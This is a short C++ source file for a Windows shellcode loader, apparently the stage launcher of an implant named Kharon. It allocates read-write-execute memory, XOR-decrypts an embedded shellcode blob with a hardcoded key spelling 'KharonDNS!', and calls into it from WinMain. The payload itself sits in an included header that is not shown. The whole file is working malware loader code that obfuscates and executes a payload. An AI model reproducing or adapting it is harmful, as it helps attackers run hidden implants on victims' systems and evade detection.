#include <Kharon.h>
#include <Shellcode.h>

auto Runner( VOID ) -> VOID {
    // Allocate RWX memory
    PVOID Mem = VirtualAlloc( NULL, Shellcode::Size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE );
    if ( !Mem ) return;

    // XOR decrypt shellcode into RWX memory
    BYTE Key[] = { 0x4B, 0x68, 0x61, 0x72, 0x6F, 0x6E, 0x44, 0x4E, 0x53, 0x21 }; // "KharonDNS!"
    volatile BYTE* Dst = (volatile BYTE*)Mem;
    for ( SIZE_T i = 0; i < Shellcode::Size; i++ ) {
        Dst[i] = Shellcode::Data[i] ^ Key[i % sizeof(Key)];
    }

    VOID ( *Kharon )( VOID ) = ( decltype( Kharon ) )Mem;
    Kharon();
}

auto WINAPI WinMain(
    _In_ HINSTANCE Instance,
    _In_ HINSTANCE PrevInstance,
    _In_ CHAR*     CommandLine,
    _In_ INT32     ShowCmd
) -> INT32 {
    Runner();
}
